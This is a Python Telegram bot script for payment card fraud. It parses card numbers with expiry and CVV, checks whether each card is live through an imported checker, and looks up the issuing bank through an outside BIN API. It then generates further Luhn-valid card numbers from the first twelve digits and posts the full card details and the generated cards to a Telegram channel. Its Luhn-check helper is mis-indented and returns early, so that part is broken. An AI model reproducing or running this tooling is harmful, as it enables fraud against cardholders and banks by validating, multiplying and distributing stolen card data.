from sys import stdin, stdout, stderr
import telebot
import re
from telebot.types import Message
import requests
from random import choice
from colorama import Fore
import random
import yaml
import os
import time
from check import check

CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = CONFIG['BOT_TOKEN']
id_channel = int(CONFIG['CHANEL_ID'])

bot = telebot.TeleBot(TOKEN, parse_mode="html")

def gen_cards(cc,mes,ano,cvv):
    genrated = 0
    ccs = []
    amount = 5
    inv = 0
    while(genrated < amount):
        genrated += 1
        s="0123456789"
        l = list(s)
        random.shuffle(l)
        result = ''.join(l)
        result = cc + result 
        if cc[0] == "3":
            ccgen = result[0:15]
        else:
            ccgen = result[0:16]
        if mes == 'x':
            mesgen = random.randint(1,12)
            if len(str(mesgen)) == 1:
                mesgen = "0" + str(mesgen)
        else:
            mesgen = mes
        if ano == 'x':
            anogen = random.randint(2022,2029)
        else:
            anogen = ano
        if cvv == 'x':
            if cc[0] == "3":
                cvvgen = random.randint(1000,9999) 
            else:
                cvvgen = random.randint(100,999)
        else:
            cvvgen = cvv   
        lista = "<code>" + str(ccgen) +"|" + str(mesgen) + "|"+ str(anogen) + "|" + str(cvvgen) + "</code>"
        cardNo = (f"{ccgen}")
        nDigits = len(cardNo)
        nSum = 0
        isSecond = False
        for i in range(nDigits - 1, -1, -1):
            d = ord(cardNo[i]) - ord('0')
            if (isSecond == True):
                d = d * 2
            nSum += d // 10
            nSum += d % 10
            isSecond = not isSecond
        if (nSum % 10 == 0):
            ccs.append(lista)
        else:
            amount+=1
            inv+=1
            if inv > 100:
                return
    cards = '\n'.join(ccs)
    return cards

def valid_lunh(cc):
    cardNo = (f"{cc}")
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
        if (isSecond == True):
            d = d * 2
            nSum += d // 10
            nSum += d % 10
            isSecond = not isSecond
        if (nSum % 10 == 0):
            return True
        else:
            return False

def proccs():
    for i in range(100):
        if(i % 2 == 0):
            print(f"--> {i + 1}%", end="\r")
        time.sleep(0.01)

print("\n\n")
print("\n--> 𝙨𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙥𝙧𝙤𝙜𝙧𝙖𝙢... 100%\n"), proccs()

def post(text):
    print("\n")
    print("--> 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙍𝙀𝘾𝙄𝙑𝙀𝘿...")
    x = re.findall(r'\d+', text)
    if len(x) == 0:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙉𝙊𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿.")
        return 
    if len(x) == 1:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙉𝙊𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿.")
        return 
    elif len(x) == 2:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙄𝙉𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝘼.")
        return
    elif len(x) == 3:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝘾𝙑𝙑 𝙉𝙊𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿.")
        return
    proccs()
    cc = x[0]
    cxc = (f"{cc}")
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    if len(cc) > 16:
        return
    if len(mm) > 2:
        return
    if len(mm) < 2:
        return
    if len(yy) > 4:
        return
    if len(yy) < 2:
        return
    if len(cvv) > 4:
        return
    if len(cvv) < 3:
        return
    if mm.startswith('2'):
        mm, yy = yy, mm
    if len(mm) >= 3:
        mm, yy, cvv = yy, cvv, mm
    if len(cc) < 15 or len(cc) > 16:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙄𝙉𝙑𝘼𝙇𝙄𝘿.")
        return
    print("--> 𝘾𝙊𝙈𝙋𝙍𝙊𝙑𝘼𝙉𝘿𝙊 𝙎𝙄 𝙇𝘼 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙀𝙎 𝙑𝘼𝙇𝙄𝘿𝘼..."), proccs()
    if valid_lunh(cc) == False:
        return print("--> 𝙀𝙇 𝙉𝙐𝙈𝙀𝙍𝙊 𝘿𝙀 𝙇𝘼 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙀𝙎 𝙄𝙉𝙑𝘼𝙇𝙄𝘿𝙊.")
    else:
        print("--> 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙑𝘼𝙇𝙄𝘿𝘼.")
    print("--> 𝘾𝙃𝙀𝙆𝙄𝙂 𝘾𝘼𝙍𝘿..."), proccs()
    xd = check(cc,mm,yy,cvv)
    if xd == False:
        return print("--> 𝘾𝘼𝙍𝘿 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿.")
    bin = cxc[0:6]
    rs = requests.get(f"https://projectslost.xyz/bin/?bin={cc}").json()
    country = rs["country"]["name"]
    flag = rs["country"]["flag"]
    bank = rs["bank"]["name"]
    brand = rs["brand"]
    type = rs["type"]
    level = rs["level"]
    ccc = (f"{cxc[0:12]}xxx|{mm}|{yy}|rnd")
    input = re.findall(r"[0-9]+", ccc)
    if len(input) == 0:
        return
    if len(input) == 1:
        cx = input[0]
        mes = 'x'
        ano = 'x'
        cvx = 'x'
    elif len(input[0]) < 6 or len(input[0]) > 16:
        return
    if len(input) == 2:
        cx = input[0]
        mes = input[1]
        ano = 'x'
        cvx = 'x'
    if len(input) == 3:
        cx = input[0]
        mes = input[1]
        ano = input[2]
        cvx = 'x'
    if len(input) == 4:
        cx = input[0]
        mes = input[1]
        ano = input[2]
        cvx = input[3]
    cards = gen_cards(cc=cx,mes=mes,ano=ano,cvv=cvx)
    text = f"""
🎄 ★━━━━━━━━━━━━━━━━━━━━★ 🎄
<b>👾 TEST KAISEN PREMIUM PROXIMAMENTE 👾</b>
🎄 ★━━━━━━━━━━━━━━━━━━━━★ 🎄
<b>CC</b>: <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>EXTRA</b> - <code>{cxc[0:12]}xxx|{mm}|{yy}|rnd</code>
<b>STATUS</b>: <b>LIVE ✅</b>
<b>RESPONCE</b>: <b>{xd}</b>
<b>INFO</b>: <b>{brand} - {type} - {level}</b>
<b>COUNTRY</b>: <b>{country} - [{flag}]</b>
<b>BANK</b>: <b>{bank}</b>
🎄 ★━━━━━━━━━━━━━━━━━━━━★ 🎄
<b>TARGETAS GENERADAS CON LA EXTRA</b>
{cards}
🎄 ★━━━━━━━━━━━━━━━━━━━━★ 🎄
<b>CREADOR</b>: @Arielito82727
"""
    print(f"--> 𝘾𝘼𝙍𝘿 𝙎𝙀𝙉𝘿𝙀𝙍: {cc}|{mm}|{yy}|{cvv}")
    print(f"--> 𝙇𝘼 𝙏𝘼𝙍𝙂𝙀𝙏𝘼 𝙀𝙎 𝙇𝙄𝙑𝙀")
    print("\n")
    bot.send_message(id_channel, text)
